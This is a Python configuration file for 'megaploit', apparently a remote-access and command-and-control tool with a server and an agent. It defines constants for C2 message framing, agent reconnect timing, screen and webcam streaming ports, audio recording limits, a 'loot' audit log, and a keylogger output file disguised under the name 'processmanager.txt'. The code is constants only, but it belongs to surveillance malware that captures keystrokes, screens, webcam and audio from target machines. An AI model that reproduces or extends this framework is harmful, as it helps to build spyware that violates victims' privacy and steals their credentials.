"""
megaploit.core.config
~~~~~~~~~~~~~~~~~~~~~
Shared constants used by both the server and agent.
"""

# TCP transport
BUFFER_SIZE: int   = 65536  # general socket read buffer — 64 KiB covers the largest
                             # post-handshake C2 frame comfortably and keeps recv()
                             # calls coarse enough not to thrash the kernel
AUTH_TIMEOUT: int  = 10    # seconds — tight window prevents connection-holding attacks
RECONNECT_DELAY: int = 10  # seconds — base delay before agent retries
RECONNECT_JITTER: int = 5  # seconds — random 0..JITTER added so multiple agents don't
                            #           reconnect in sync after a server restart

# Frame / message size limits
# MAX_PLUGIN_MSG_SIZE is enforced by _recv_framed in protocol.py as a safety cap
# against memory exhaustion from a rogue or malformed peer.  It must be large
# enough for:
#   - large plugin output blobs (stdout of compiled C/C++ plugins)
#   - screenshot JPEG frames   (~200–400 KB per frame at quality 85)
#   - zip downloads / timelapse zips
# 256 MiB is generous for all of the above while still catching runaway allocations.
MAX_PLUGIN_MSG_SIZE: int = 256 * 1024 * 1024   # 256 MiB hard cap per framed message

# WebSocket frame size cap — applied before allocating the payload buffer in
# WsTransport._read_frame().  Reuses MAX_PLUGIN_MSG_SIZE as the ceiling so the
# two limits stay consistent; override here if WS frames need a tighter bound.
MAX_WEBSOCKET_FRAME_SIZE: int = MAX_PLUGIN_MSG_SIZE

# Listener hardening
MAX_AUTH_ATTEMPTS_PER_MIN: int = 5   # per source IP; excess connections are dropped
IP_BAN_DURATION: int = 300           # seconds an IP stays banned after exceeding the limit

# Protocol downgrade policy
# When a shared secret (key) is configured, encryption is REQUIRED by default.
# Setting this to True re-enables the silent v1 plaintext fallback for legacy
# compatibility with agents that do not support the v2 encrypted protocol.
# WARNING: enabling this allows a MITM to strip encryption silently.
ALLOW_PLAINTEXT_FALLBACK: bool = False

# Stream framing
END_SENTINEL: bytes = b"<<MEGAPLOIT_END>>"

# Streaming server ports (on the agent machine)
SCREEN_STREAM_PORT: int = 5000
WEBCAM_STREAM_PORT: int = 5001

# Audio recording cap
MAX_RECORD_SECONDS: int = 300

# Audit log path (server-side, relative to CWD)
AUDIT_LOG: str = "loot/audit.log"

# File paths (agent)
import os as _os
import sys as _sys

if _sys.platform == "win32":
    KEYLOG_PATH: str = _os.path.join(_os.environ.get("APPDATA", "."), "processmanager.txt")
else:
    KEYLOG_PATH: str = _os.path.join(_os.environ.get("HOME", "."), ".config", "processmanager.txt")
